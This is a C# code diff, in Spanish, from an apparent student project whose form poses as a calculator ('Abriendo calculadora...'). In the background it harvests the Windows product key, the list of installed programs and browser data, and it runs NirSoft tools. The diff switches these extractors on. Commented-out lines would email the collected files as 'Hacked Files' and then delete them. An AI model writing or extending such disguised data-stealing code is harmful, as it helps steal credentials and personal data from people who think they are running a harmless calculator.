@@ -10,18 +10,22 @@ namespace TP
     {
         protected List<DataExtractor> dataExtractors;
 
-        protected List<string> nirsoftExecutablePaths;
+        protected List<string> nirsoftResources;
 
         public Form1()
         {
             InitializeComponent();
+
+            // Extractores de datos implementados
             dataExtractors = new List<DataExtractor>();
-            //dataExtractors.Add(new WindowsProductKeyDataExtractor("productKey"));
-            //dataExtractors.Add(new ProgramsListDataExtractor("programsList"));
+            dataExtractors.Add(new WindowsProductKeyDataExtractor("productKey"));
+            dataExtractors.Add(new ProgramsListDataExtractor("programsList"));
             dataExtractors.Add(new BrowserDataExtractor("browsersData"));
 
-            nirsoftExecutablePaths = new List<string>();
-            //nirsoftExecutablePaths.Add("awatch.exe");
+            // Extractores de datos de Nirsoft
+            nirsoftResources = new List<string>();
+            nirsoftResources.Add("DriverView");
+            nirsoftResources.Add("awatch");
         }
 
         #region Calculadora
@@ -110,8 +114,8 @@ namespace TP
         private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
         {
             Console.WriteLine("Abriendo calculadora. Por favor espere...");
-            List<string> files = Helpers.applyDataExtractionActions(dataExtractors, nirsoftExecutablePaths);
-            //Helpers.sendMail("Hack Test", "Hacked Files", files);
+            List<string> files = Helpers.ApplyDataExtractionActions(dataExtractors, nirsoftResources);
+            //Helpers.SendMail("Hack Test", "Hacked Files", files);
             //Helpers.RemoveFiles(files);
         }
 
